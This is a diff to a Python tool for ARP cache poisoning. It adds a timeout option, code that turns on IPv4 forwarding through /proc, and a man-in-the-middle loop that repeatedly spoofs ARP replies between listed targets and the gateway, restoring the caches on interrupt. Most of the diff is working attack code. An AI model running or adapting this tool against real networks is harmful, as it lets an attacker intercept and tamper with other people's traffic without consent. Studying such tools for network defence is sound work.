@@ -3,14 +3,13 @@ import argparse
 import subprocess
 import os
 import sys
-import signal 
 import apt
 
-from scapy.all import srp, Ether, ARP
 from time import sleep
 
 # CUSTOM RESOURCES
 from library.validate_address import AddressValidator
+from library.custom_arp_lib import spoof, restore
 
 # CREATE PARSER
 parser = argparse.ArgumentParser()
@@ -27,6 +26,9 @@ parser.add_argument("--targeting", required=isMitmMode, help="For MITM mode. A s
 isCaptureMode = "--mode" in sys.argv and "CAPTURE" in sys.argv
 parser.add_argument("--impersonate", required=isCaptureMode, help="For CAPTURE mode. The IP address to capture traffic to ")
 parser.add_argument("--deceive", required=isCaptureMode, help="For CAPTURE mode. The IP address or a file containing IP addresses to poison the ARP cache(s) of.")
+
+parser.add_argument("--timeout", help="Timeout in seconds between ARP requests. Default is 45.")
+
 # VALIDATE ARGUMENTS
 if not (isCaptureMode or isMitmMode):
     print(f'Specify a valid mode with the --mode flag! Use the -h option for help')
@@ -53,8 +55,32 @@ else:
 # PARSE ARGUMENTS
 args = parser.parse_args()
 mode = args.mode
+timeout = None
+if not args.timeout:
+    timeout = 45
+else:
+    timeout = args.timeout
+
 if not mode:
     print(f'[!] Error: specify a valid mode of either MITM or CAPTURE with the --mode flag')
+
+# ENABLE ROUTE FORWARDING
+print(f'[+] Checking to see if IPv4 forwarding is enabled')
+fp = "/proc/sys/net/ipv4/ip_forward"
+with open(fp, 'r') as f:
+    val = f.read().strip()
+    if val == '1':
+        print(f'[+] IPv4 forwarding is already enabled')
+        fwd_enabled = True
+    else:
+        print(val)
+        print(f'[+] IPv4 forwarding is currently disabled. Enabling...')
+        fwd_enabled = False
+ 
+if not fwd_enabled:
+     with open(fp, 'w') as f:
+         print(1, file=f)
+         print(f'[+] IPv4 forwarding enabled successfully')
 
 
 ############################################################
@@ -91,6 +117,32 @@ if isMitmMode:
         print(f'\t{GATEWAY} is not a valid IP Address!')
         quit()
 
+    # DO THE SPOOFING
+    try:
+
+        while(True):
+            for target in TARGETS:
+
+                # CONVINCE EACH TARGET I AM THE GATEWAY
+                print(f'[+] Impersonating {GATEWAY} to {target}')
+                spoof(target, GATEWAY) 
+
+                # CONVINCE THE GATEWAY i AM EACH TARGET
+                print(f'[+] Impersonating {target} to {GATEWAY}')
+                spoof(GATEWAY, target) 
+
+
+            sleep(timeout)    # WAIT <timeout> SECONDS IN BETWEEN REQUESTS
+
+
+    except KeyboardInterrupt:
+        print(f'\n[+] Detected Interrupt. Restoring the network, please wait!')
+        for target in TARGETS:
+            print(f'[+] Restoring proper \'route\' from {GATEWAY} to {target}')
+            restore(GATEWAY, target)
+            print(f'[+] Restoring proper \'route\' from {target} to {GATEWAY}')
+            restore(target, GATEWAY)
+        quit()
 ############################################################
 # FOR CAPTURE MODE
 ############################################################
